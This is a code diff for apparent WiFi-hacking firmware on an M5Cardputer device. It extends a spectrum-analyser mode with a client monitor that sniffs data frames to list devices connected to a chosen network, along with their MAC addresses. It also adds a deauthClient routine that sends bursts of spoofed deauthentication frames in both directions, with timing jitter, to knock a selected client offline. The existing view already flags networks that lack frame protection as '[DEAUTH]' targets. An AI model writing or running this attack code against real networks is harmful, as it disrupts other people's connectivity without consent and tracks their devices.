@@ -3,6 +3,7 @@
 #include "spectrum.h"
 #include "oink.h"
 #include "../core/config.h"
+#include "../core/oui.h"
 #include "../core/wsl_bypasser.h"
 #include "../core/xp.h"
 #include "../ui/display.h"
@@ -35,6 +36,9 @@ const float PAN_STEP_MHZ = 5.0f;           // One channel per pan
 const uint32_t STALE_TIMEOUT_MS = 5000;    // Remove networks after 5s silence
 const uint32_t UPDATE_INTERVAL_MS = 100;   // 10 FPS update rate
 
+// Memory limits
+const size_t MAX_SPECTRUM_NETWORKS = 100;  // Cap networks to prevent OOM
+
 // Static members
 bool SpectrumMode::running = false;
 volatile bool SpectrumMode::busy = false;
@@ -50,6 +54,17 @@ uint32_t SpectrumMode::startTime = 0;
 volatile bool SpectrumMode::pendingReveal = false;
 char SpectrumMode::pendingRevealSSID[33] = {0};
 
+// Client monitoring state
+bool SpectrumMode::monitoringNetwork = false;
+int SpectrumMode::monitoredNetworkIndex = -1;
+uint8_t SpectrumMode::monitoredBSSID[6] = {0};
+uint8_t SpectrumMode::monitoredChannel = 0;
+int SpectrumMode::clientScrollOffset = 0;
+int SpectrumMode::selectedClientIndex = 0;
+uint32_t SpectrumMode::lastClientPrune = 0;
+uint8_t SpectrumMode::clientsDiscoveredThisSession = 0;
+volatile bool SpectrumMode::pendingClientBeep = false;
+
 void SpectrumMode::init() {
     networks.clear();
     viewCenterMHz = DEFAULT_CENTER_MHZ;
@@ -62,6 +77,17 @@ void SpectrumMode::init() {
     busy = false;
     pendingReveal = false;
     pendingRevealSSID[0] = 0;
+    
+    // Reset client monitoring state
+    monitoringNetwork = false;
+    monitoredNetworkIndex = -1;
+    memset(monitoredBSSID, 0, 6);
+    monitoredChannel = 0;
+    clientScrollOffset = 0;
+    selectedClientIndex = 0;
+    lastClientPrune = 0;
+    clientsDiscoveredThisSession = 0;
+    pendingClientBeep = false;
 }
 
 void SpectrumMode::start() {
@@ -84,6 +110,7 @@ void SpectrumMode::start() {
     
     // Set promiscuous callback and enable
     esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
+    esp_wifi_set_promiscuous_filter(nullptr);  // Receive all packet types (mgmt + data)
     esp_wifi_set_promiscuous(true);
     
     // Start on channel 1, will hop through all
@@ -101,6 +128,9 @@ void SpectrumMode::stop() {
     if (!running) return;
     
     Serial.println("[SPECTRUM] Stopping...");
+    
+    // [P4] Ensure monitoring is disabled
+    monitoringNetwork = false;
     
     esp_wifi_set_promiscuous(false);
     
@@ -121,20 +151,63 @@ void SpectrumMode::update() {
         pendingReveal = false;
     }
     
+    // Process deferred client beep (from callback)
+    if (pendingClientBeep) {
+        pendingClientBeep = false;
+        if (Config::personality().soundEnabled) {
+            M5.Speaker.tone(1200, 80);  // Short high beep for new client
+        }
+    }
+    
+    // [P2] Verify monitored network still exists and signal is fresh
+    if (monitoringNetwork) {
+        bool networkLost = false;
+        
+        // Check if network got shuffled out
+        if (monitoredNetworkIndex >= (int)networks.size() ||
+            !macEqual(networks[monitoredNetworkIndex].bssid, monitoredBSSID)) {
+            networkLost = true;
+        }
+        // Check signal timeout (no beacon for 15 seconds)
+        else if (now - networks[monitoredNetworkIndex].lastSeen > SIGNAL_LOST_TIMEOUT_MS) {
+            networkLost = true;
+        }
+        
+        if (networkLost) {
+            // Two descending beeps for signal lost
+            if (Config::personality().soundEnabled) {
+                M5.Speaker.tone(800, 100);
+                delay(120);
+                M5.Speaker.tone(500, 150);
+            }
+            Display::showToast("Signal lost");
+            delay(300);  // Brief pause so user sees toast
+            exitClientMonitor();
+        }
+    }
+    
     // Handle input
     handleInput();
     
-    // Channel hopping - cycle through all channels for full spectrum view
-    if (now - lastHopTime > 100) {  // 100ms per channel = ~1.3s full sweep
-        currentChannel = (currentChannel % 13) + 1;
-        esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
-        lastHopTime = now;
+    // Channel hopping - skip when monitoring a specific network
+    if (!monitoringNetwork) {
+        if (now - lastHopTime > 100) {  // 100ms per channel = ~1.3s full sweep
+            currentChannel = (currentChannel % 13) + 1;
+            esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
+            lastHopTime = now;
+        }
     }
     
-    // Prune stale networks periodically
-    if (now - lastUpdateTime > UPDATE_INTERVAL_MS) {
+    // Prune stale networks periodically (only when NOT monitoring)
+    if (!monitoringNetwork && now - lastUpdateTime > UPDATE_INTERVAL_MS) {
         pruneStale();
         lastUpdateTime = now;
+    }
+    
+    // Prune stale clients when monitoring
+    if (monitoringNetwork && (now - lastClientPrune > 5000)) {
+        lastClientPrune = now;
+        pruneStaleClients();
     }
     
     // N13TZSCH3 achievement - stare into the ether for 15 minutes
@@ -147,6 +220,12 @@ void SpectrumMode::update() {
 }
 
 void SpectrumMode::handleInput() {
+    // [P11] Single state check at TOP - no fall-through!
+    if (monitoringNetwork) {
+        handleClientMonitorInput();
+        return;
+    }
+    
     bool anyPressed = M5Cardputer.Keyboard.isPressed();
     
     if (!anyPressed) {
@@ -169,12 +248,91 @@ void SpectrumMode::handleInput() {
         viewCenterMHz = fmin(MAX_CENTER_MHZ, viewCenterMHz + PAN_STEP_MHZ);
     }
     
-    // Cycle through networks with Enter
-    if (keys.enter && !networks.empty()) {
-        selectedIndex = (selectedIndex + 1) % (int)networks.size();
-        // Center view on selected network
+    // Cycle through networks with ; and .
+    if (M5Cardputer.Keyboard.isKeyPressed(';') && !networks.empty()) {
+        selectedIndex = (selectedIndex - 1 + (int)networks.size()) % (int)networks.size();
         if (selectedIndex >= 0 && selectedIndex < (int)networks.size()) {
             viewCenterMHz = channelToFreq(networks[selectedIndex].channel);
+        }
+    }
+    if (M5Cardputer.Keyboard.isKeyPressed('.') && !networks.empty()) {
+        selectedIndex = (selectedIndex + 1) % (int)networks.size();
+        if (selectedIndex >= 0 && selectedIndex < (int)networks.size()) {
+            viewCenterMHz = channelToFreq(networks[selectedIndex].channel);
+        }
+    }
+    
+    // Enter: start monitoring selected network
+    if (keys.enter && !networks.empty()) {
+        if (selectedIndex >= 0 && selectedIndex < (int)networks.size()) {
+            enterClientMonitor();
+        }
+    }
+}
+
+// Handle input when in client monitor overlay [P11] [P13] [P14]
+void SpectrumMode::handleClientMonitorInput() {
+    bool anyPressed = M5Cardputer.Keyboard.isPressed();
+    
+    if (!anyPressed) {
+        keyWasPressed = false;
+        return;
+    }
+    
+    if (keyWasPressed) return;
+    keyWasPressed = true;
+    
+    Display::resetDimTimer();
+    
+    // Exit keys (backtick or backspace)
+    if (M5Cardputer.Keyboard.isKeyPressed('`') || 
+        M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
+        exitClientMonitor();
+        return;
+    }
+    
+    // B key: add to BOAR BROS and exit [P13]
+    if (M5Cardputer.Keyboard.isKeyPressed('b') || M5Cardputer.Keyboard.isKeyPressed('B')) {
+        if (monitoredNetworkIndex >= 0 && 
+            monitoredNetworkIndex < (int)networks.size()) {
+            // Add to BOAR BROS via OinkMode
+            OinkMode::excludeNetworkByBSSID(networks[monitoredNetworkIndex].bssid,
+                                             networks[monitoredNetworkIndex].ssid);
+            Display::showToast("Excluded - returning");
+            delay(500);
+            exitClientMonitor();
+        }
+        return;
+    }
+    
+    // Get client count safely [P14]
+    int clientCount = 0;
+    if (monitoredNetworkIndex >= 0 && 
+        monitoredNetworkIndex < (int)networks.size()) {
+        clientCount = networks[monitoredNetworkIndex].clientCount;
+    }
+    
+    // Navigation only if clients exist [P14]
+    if (clientCount > 0) {
+        if (M5Cardputer.Keyboard.isKeyPressed(';')) {
+            selectedClientIndex = max(0, selectedClientIndex - 1);
+            // Adjust scroll if needed
+            if (selectedClientIndex < clientScrollOffset) {
+                clientScrollOffset = selectedClientIndex;
+            }
+        }
+        
+        if (M5Cardputer.Keyboard.isKeyPressed('.')) {
+            selectedClientIndex = min(clientCount - 1, selectedClientIndex + 1);
+            // Adjust scroll if needed
+            if (selectedClientIndex >= clientScrollOffset + VISIBLE_CLIENTS) {
+                clientScrollOffset = selectedClientIndex - VISIBLE_CLIENTS + 1;
+            }
+        }
+        
+        // Enter: deauth selected client [P14]
+        if (M5Cardputer.Keyboard.keysState().enter) {
+            deauthClient(selectedClientIndex);
         }
     }
 }
@@ -182,35 +340,40 @@ void SpectrumMode::handleInput() {
 void SpectrumMode::draw(M5Canvas& canvas) {
     canvas.fillSprite(COLOR_BG);
     
-    // Draw spectrum visualization
-    drawAxis(canvas);
-    drawSpectrum(canvas);
-    drawChannelMarkers(canvas);
-    
-    // Draw status indicators if network is selected
-    if (selectedIndex >= 0 && selectedIndex < (int)networks.size()) {
-        const auto& net = networks[selectedIndex];
-        canvas.setTextSize(1);
-        canvas.setTextColor(COLOR_FG);
-        canvas.setTextDatum(top_left);
+    // Draw client overlay when monitoring, otherwise spectrum
+    if (monitoringNetwork) {
+        drawClientOverlay(canvas);
+    } else {
+        // Draw spectrum visualization
+        drawAxis(canvas);
+        drawSpectrum(canvas);
+        drawChannelMarkers(canvas);
         
-        // Build status string: [VULN!] and/or [DEAUTH] and/or [BRO]
-        String status = "";
-        if (isVulnerable(net.authmode)) {
-            status += "[VULN!]";
-        }
-        if (!net.hasPMF) {
-            status += "[DEAUTH]";
-        }
-        if (OinkMode::isExcluded(net.bssid)) {
-            status += "[BRO]";
-        }
-        if (status.length() > 0) {
-            canvas.drawString(status, SPECTRUM_LEFT + 2, SPECTRUM_TOP);
+        // Draw status indicators if network is selected
+        if (selectedIndex >= 0 && selectedIndex < (int)networks.size()) {
+            const auto& net = networks[selectedIndex];
+            canvas.setTextSize(1);
+            canvas.setTextColor(COLOR_FG);
+            canvas.setTextDatum(top_left);
+            
+            // Build status string: [VULN!] and/or [DEAUTH] and/or [BRO]
+            String status = "";
+            if (isVulnerable(net.authmode)) {
+                status += "[VULN!]";
+            }
+            if (!net.hasPMF) {
+                status += "[DEAUTH]";
+            }
+            if (OinkMode::isExcluded(net.bssid)) {
+                status += "[BRO]";
+            }
+            if (status.length() > 0) {
+                canvas.drawString(status, SPECTRUM_LEFT + 2, SPECTRUM_TOP);
+            }
         }
     }
     
-    // Draw XP bar at bottom (y=91+)
+    // Draw XP bar at bottom (y=91+) - always visible [P12]
     XP::drawBar(canvas);
 }
 
@@ -265,6 +428,100 @@ void SpectrumMode::drawChannelMarkers(M5Canvas& canvas) {
     canvas.setTextDatum(middle_right);
     if (rightEdge < 2477) {  // More channels to the right
         canvas.drawString(">", SPECTRUM_RIGHT + 1, SPECTRUM_BOTTOM / 2);
+    }
+}
+
+// Draw client monitoring overlay [P3] [P12] [P14] [P15]
+void SpectrumMode::drawClientOverlay(M5Canvas& canvas) {
+    // [P12] Draw in mainCanvas area only (y=0 to y=90 max)
+    // XP bar is at y=91, drawn separately in draw()
+    
+    canvas.setTextSize(1);
+    canvas.setTextColor(COLOR_FG, COLOR_BG);
+    
+    // Bounds check [P3]
+    if (monitoredNetworkIndex < 0 || 
+        monitoredNetworkIndex >= (int)networks.size()) {
+        canvas.setTextDatum(middle_center);
+        canvas.drawString("Network lost", 120, 45);
+        return;
+    }
+    
+    SpectrumNetwork& net = networks[monitoredNetworkIndex];
+    
+    // Header: SSID or <hidden> [P15]
+    char header[40];
+    if (net.ssid[0] == 0) {
+        snprintf(header, sizeof(header), "CLIENTS: <hidden> CH%d", net.channel);
+    } else {
+        char truncSSID[16];
+        strncpy(truncSSID, net.ssid, 15);
+        truncSSID[15] = '\0';  // [P9] Explicit null termination
+        snprintf(header, sizeof(header), "CLIENTS: %s CH%d", truncSSID, net.channel);
+    }
+    canvas.setTextDatum(top_left);
+    canvas.drawString(header, 4, 2);
+    
+    // Empty list message [P14]
+    if (net.clientCount == 0) {
+        canvas.setTextDatum(middle_center);
+        canvas.drawString("No clients detected", 120, 40);
+        canvas.drawString("Waiting for data frames...", 120, 55);
+        return;
+    }
+    
+    // Client list (starts at y=18, 16px per line, max 4 visible)
+    const int LINE_HEIGHT = 16;
+    const int START_Y = 18;
+    
+    for (int i = 0; i < VISIBLE_CLIENTS && (i + clientScrollOffset) < net.clientCount; i++) {
+        int clientIdx = i + clientScrollOffset;
+        
+        // Bounds check [P3]
+        if (clientIdx >= net.clientCount) break;
+        
+        SpectrumClient& client = net.clients[clientIdx];
+        
+        int y = START_Y + (i * LINE_HEIGHT);
+        bool selected = (clientIdx == selectedClientIndex);
+        
+        // Highlight selected row
+        if (selected) {
+            canvas.fillRect(0, y, 240, LINE_HEIGHT, COLOR_FG);
+            canvas.setTextColor(COLOR_BG, COLOR_FG);
+        } else {
+            canvas.setTextColor(COLOR_FG, COLOR_BG);
+        }
+        
+        // Format: "1. Vendor  XX:XX:XX  -XXdB  Xs"
+        uint32_t age = (millis() - client.lastSeen) / 1000;
+        char line[48];
+        
+        // Get vendor from OUI database [P7]
+        const char* vendor = OUI::getVendor(client.mac);
+        
+        // [P9] Safe string formatting with bounds
+        // Show vendor (9 chars) + last 3 octets for identification
+        snprintf(line, sizeof(line), "%d.%-9s %02X:%02X:%02X %4ddB %lus",
+            clientIdx + 1,
+            vendor,
+            client.mac[3], client.mac[4], client.mac[5],
+            client.rssi,
+            age);
+        
+        canvas.setTextDatum(top_left);
+        canvas.drawString(line, 4, y + 2);
+    }
+    
+    // Scroll indicators
+    canvas.setTextColor(COLOR_FG, COLOR_BG);
+    if (clientScrollOffset > 0) {
+        canvas.setTextDatum(top_right);
+        canvas.drawString("^", 236, 18);  // More above
+    }
+    if (clientScrollOffset + VISIBLE_CLIENTS < net.clientCount) {
+        canvas.setTextDatum(bottom_right);
+        canvas.drawString("v", 236, 82);  // More below
     }
 }
 
@@ -373,6 +630,13 @@ void SpectrumMode::pruneStale() {
     
     uint32_t now = millis();
     
+    // Save BSSID of selected network before pruning
+    uint8_t selectedBSSID[6] = {0};
+    bool hadSelection = (selectedIndex >= 0 && selectedIndex < (int)networks.size());
+    if (hadSelection) {
+        memcpy(selectedBSSID, networks[selectedIndex].bssid, 6);
+    }
+    
     // Remove networks not seen recently
     networks.erase(
         std::remove_if(networks.begin(), networks.end(), 
@@ -382,8 +646,17 @@ void SpectrumMode::pruneStale() {
         networks.end()
     );
     
-    // Fix selectedIndex if it's now out of bounds
-    if (selectedIndex >= (int)networks.size()) {
+    // Restore selection by finding BSSID in new vector
+    if (hadSelection) {
+        selectedIndex = -1;  // Assume lost
+        for (size_t i = 0; i < networks.size(); i++) {
+            if (memcmp(networks[i].bssid, selectedBSSID, 6) == 0) {
+                selectedIndex = (int)i;
+                break;
+            }
+        }
+    } else if (selectedIndex >= (int)networks.size()) {
+        // No prior selection, just bounds-check
         selectedIndex = networks.empty() ? -1 : 0;
     }
     
@@ -446,6 +719,11 @@ void SpectrumMode::onBeacon(const uint8_t* bssid, uint8_t channel, int8_t rssi, 
     net.hasPMF = hasPMF;
     net.wasRevealed = false;
     
+    // Cap networks to prevent OOM
+    if (networks.size() >= MAX_SPECTRUM_NETWORKS) {
+        return;  // At capacity, skip
+    }
+    
     networks.push_back(net);
     
     // Award XP for new network discovery (+1 XP, passive observation)
@@ -460,6 +738,19 @@ void SpectrumMode::onBeacon(const uint8_t* bssid, uint8_t channel, int8_t rssi, 
 String SpectrumMode::getSelectedInfo() {
     // Guard against callback race
     if (busy) return "Scanning...";
+    
+    // [P8] Client monitoring mode - show monitored network + client count
+    if (monitoringNetwork) {
+        if (monitoredNetworkIndex >= 0 && monitoredNetworkIndex < (int)networks.size()) {
+            const auto& net = networks[monitoredNetworkIndex];
+            char buf[48];
+            const char* ssid = net.ssid[0] ? net.ssid : "[hidden]";
+            snprintf(buf, sizeof(buf), "MON:%s C:%d CH%d", 
+                     ssid, net.clientCount, net.channel);
+            return String(buf);
+        }
+        return "Monitoring...";
+    }
     
     if (selectedIndex >= 0 && selectedIndex < (int)networks.size()) {
         const auto& net = networks[selectedIndex];
@@ -495,13 +786,21 @@ String SpectrumMode::getSelectedInfo() {
 // Promiscuous callback - extract beacon info
 void SpectrumMode::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
     if (!running) return;
-    if (type != WIFI_PKT_MGMT) return;
+    if (busy) return;  // [P1] Main thread is iterating
     
     const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
     const uint8_t* payload = pkt->payload;
     uint16_t len = pkt->rx_ctrl.sig_len;
     int8_t rssi = pkt->rx_ctrl.rssi;
     uint8_t channel = pkt->rx_ctrl.channel;
+    
+    // Handle data frames when monitoring
+    if (type == WIFI_PKT_DATA && monitoringNetwork) {
+        processDataFrame(payload, len, rssi);
+        return;
+    }
+    
+    if (type != WIFI_PKT_MGMT) return;
     
     if (len < 36) return;
     
@@ -646,4 +945,259 @@ bool SpectrumMode::detectPMF(const uint8_t* payload, uint16_t len) {
     }
     
     return false;
+}
+
+// Process data frame to extract client MAC
+void SpectrumMode::processDataFrame(const uint8_t* payload, uint16_t len, int8_t rssi) {
+    if (len < 24) return;  // Too short for valid data frame
+    
+    // Frame Control is 2 bytes - ToDS/FromDS are in byte 1, not byte 0
+    // Byte 0: Protocol(2) + Type(2) + Subtype(4)
+    // Byte 1: ToDS(1) + FromDS(1) + MoreFrag + Retry + PwrMgmt + MoreData + Protected + Order
+    uint8_t flags = payload[1];
+    uint8_t toDS = (flags & 0x01);
+    uint8_t fromDS = (flags & 0x02) >> 1;
+    
+    uint8_t bssid[6];
+    uint8_t clientMac[6];
+    
+    if (toDS && !fromDS) {
+        // Client -> AP: addr1=BSSID, addr2=client
+        memcpy(bssid, payload + 4, 6);
+        memcpy(clientMac, payload + 10, 6);
+    } else if (!toDS && fromDS) {
+        // AP -> Client: addr1=client, addr2=BSSID
+        memcpy(clientMac, payload + 4, 6);
+        memcpy(bssid, payload + 10, 6);
+    } else {
+        return;  // WDS or IBSS, ignore
+    }
+    
+    // [P2] Verify BSSID matches monitored network
+    if (!macEqual(bssid, monitoredBSSID)) return;
+    
+    // Skip broadcast/multicast clients
+    if (clientMac[0] & 0x01) return;
+    
+    trackClient(bssid, clientMac, rssi);
+}
+
+// Track client connected to monitored network
+void SpectrumMode::trackClient(const uint8_t* bssid, const uint8_t* clientMac, int8_t rssi) {
+    // Skip if main thread is busy (race prevention)
+    if (busy) return;
+    
+    // Bounds check [P3]
+    if (monitoredNetworkIndex < 0 || monitoredNetworkIndex >= (int)networks.size()) {
+        // Don't call exitClientMonitor from callback - just skip
+        return;
+    }
+    
+    SpectrumNetwork& net = networks[monitoredNetworkIndex];
+    
+    // Double-check BSSID still matches [P2]
+    if (!macEqual(net.bssid, monitoredBSSID)) {
+        // Don't call exitClientMonitor from callback - just skip
+        return;
+    }
+    
+    uint32_t now = millis();
+    
+    // Check if client already tracked
+    for (int i = 0; i < net.clientCount; i++) {
+        if (macEqual(net.clients[i].mac, clientMac)) {
+            net.clients[i].rssi = rssi;
+            net.clients[i].lastSeen = now;
+            return;  // Updated existing
+        }
+    }
+    
+    // Add new client if room
+    if (net.clientCount < MAX_SPECTRUM_CLIENTS) {
+        memcpy(net.clients[net.clientCount].mac, clientMac, 6);
+        net.clients[net.clientCount].rssi = rssi;
+        net.clients[net.clientCount].lastSeen = now;
+        net.clientCount++;
+        
+        // Request beep for first few clients (avoid spamming)
+        if (clientsDiscoveredThisSession < CLIENT_BEEP_LIMIT) {
+            clientsDiscoveredThisSession++;
+            pendingClientBeep = true;
+        }
+        
+        Serial.printf("[SPECTRUM] New client: %02X:%02X:%02X:%02X:%02X:%02X\n",
+            clientMac[0], clientMac[1], clientMac[2],
+            clientMac[3], clientMac[4], clientMac[5]);
+    }
+}
+
+// Enter client monitoring mode for selected network [P5]
+void SpectrumMode::enterClientMonitor() {
+    busy = true;  // [P5] Block callback FIRST
+    
+    // Bounds check [P3]
+    if (selectedIndex < 0 || selectedIndex >= (int)networks.size()) {
+        busy = false;
+        return;
+    }
+    
+    SpectrumNetwork& net = networks[selectedIndex];
+    
+    // Store BSSID separately [P2]
+    memcpy(monitoredBSSID, net.bssid, 6);
+    monitoredNetworkIndex = selectedIndex;
+    monitoredChannel = net.channel;
+    
+    // Clear any old client data [P6]
+    net.clientCount = 0;
+    
+    // Reset UI state
+    clientScrollOffset = 0;
+    selectedClientIndex = 0;
+    lastClientPrune = millis();
+    clientsDiscoveredThisSession = 0;  // Reset beep counter
+    pendingClientBeep = false;         // Clear any pending beep
+    
+    // Lock channel
+    esp_wifi_set_channel(monitoredChannel, WIFI_SECOND_CHAN_NONE);
+    
+    // Short beep for channel lock
+    if (Config::personality().soundEnabled) {
+        M5.Speaker.tone(700, 80);
+    }
+    
+    Serial.printf("[SPECTRUM] Monitoring %s on CH%d\n", 
+        net.ssid[0] ? net.ssid : "<hidden>", monitoredChannel);
+    
+    // NOW enable monitoring (after all state is ready) [P5]
+    monitoringNetwork = true;
+    
+    busy = false;
+}
+
+// Exit client monitoring mode [P4] [P5]
+void SpectrumMode::exitClientMonitor() {
+    busy = true;  // [P5] Block callback FIRST
+    
+    monitoringNetwork = false;  // [P4] Disable monitoring immediately
+    
+    // Clear client data to free memory [P6]
+    if (monitoredNetworkIndex >= 0 && 
+        monitoredNetworkIndex < (int)networks.size()) {
+        networks[monitoredNetworkIndex].clientCount = 0;
+    }
+    
+    // Reset indices
+    monitoredNetworkIndex = -1;
+    memset(monitoredBSSID, 0, 6);
+    
+    Serial.println("[SPECTRUM] Exited client monitor");
+    
+    busy = false;
+    
+    // Channel hopping resumes automatically in next update()
+}
+
+// Prune stale clients [P1] [P3] [P10]
+void SpectrumMode::pruneStaleClients() {
+    busy = true;  // [P1] Block callback
+    
+    // Bounds check [P3]
+    if (monitoredNetworkIndex < 0 || 
+        monitoredNetworkIndex >= (int)networks.size()) {
+        busy = false;
+        return;
+    }
+    
+    SpectrumNetwork& net = networks[monitoredNetworkIndex];
+    uint32_t now = millis();
+    
+    // [P10] Iterate BACKWARDS to handle removal safely
+    for (int i = net.clientCount - 1; i >= 0; i--) {
+        if ((now - net.clients[i].lastSeen) > CLIENT_STALE_TIMEOUT_MS) {
+            // Remove this client by shifting array
+            for (int j = i; j < net.clientCount - 1; j++) {
+                net.clients[j] = net.clients[j + 1];
+            }
+            net.clientCount--;
+        }
+    }
+    
+    // [P3] Fix selectedClientIndex if now out of bounds
+    if (net.clientCount == 0) {
+        selectedClientIndex = 0;
+        clientScrollOffset = 0;
+    } else if (selectedClientIndex >= net.clientCount) {
+        selectedClientIndex = net.clientCount - 1;
+    }
+    
+    // Fix scroll offset if needed
+    if (clientScrollOffset > 0 && 
+        clientScrollOffset >= net.clientCount) {
+        int maxOffset = net.clientCount - VISIBLE_CLIENTS;
+        clientScrollOffset = maxOffset > 0 ? maxOffset : 0;
+    }
+    
+    busy = false;
+}
+
+// Get monitored network SSID [P3] [P15]
+String SpectrumMode::getMonitoredSSID() {
+    if (!monitoringNetwork) return "";
+    if (monitoredNetworkIndex < 0 || 
+        monitoredNetworkIndex >= (int)networks.size()) return "";
+    
+    const char* ssid = networks[monitoredNetworkIndex].ssid;
+    if (ssid[0] == 0) return "<hidden>";  // [P15]
+    
+    // Truncate for bottom bar [P9]
+    char truncated[12];
+    strncpy(truncated, ssid, 11);
+    truncated[11] = '\0';
+    return String(truncated);
+}
+
+// Get client count for monitored network [P3]
+int SpectrumMode::getClientCount() {
+    if (!monitoringNetwork) return 0;
+    if (monitoredNetworkIndex < 0 || 
+        monitoredNetworkIndex >= (int)networks.size()) return 0;
+    return networks[monitoredNetworkIndex].clientCount;
+}
+
+// Show client detail popup [P3] [P9]
+void SpectrumMode::deauthClient(int idx) {
+    // Bounds check [P3]
+    if (monitoredNetworkIndex < 0 || 
+        monitoredNetworkIndex >= (int)networks.size()) return;
+    if (idx < 0 || idx >= networks[monitoredNetworkIndex].clientCount) return;
+    
+    const SpectrumNetwork& net = networks[monitoredNetworkIndex];
+    const SpectrumClient& client = net.clients[idx];
+    
+    // Send deauth burst (5 frames with jitter)
+    int sent = 0;
+    for (int i = 0; i < 5; i++) {
+        // Forward: AP -> Client
+        if (WSLBypasser::sendDeauthFrame(net.bssid, net.channel, client.mac, 7)) {
+            sent++;
+        }
+        delay(random(1, 6));  // 1-5ms jitter
+        
+        // Reverse: Client -> AP (spoofed)
+        WSLBypasser::sendDeauthFrame(client.mac, net.channel, net.bssid, 8);
+        delay(random(1, 6));
+    }
+    
+    // Feedback beep (low thump)
+    if (Config::personality().soundEnabled) {
+        M5Cardputer.Speaker.tone(600, 80);
+    }
+    
+    // Short toast with client MAC suffix
+    char msg[24];
+    snprintf(msg, sizeof(msg), "DEAUTH %02X:%02X x%d",
+        client.mac[4], client.mac[5], sent);
+    Display::showToast(msg);
+    delay(300);  // Brief feedback
 }
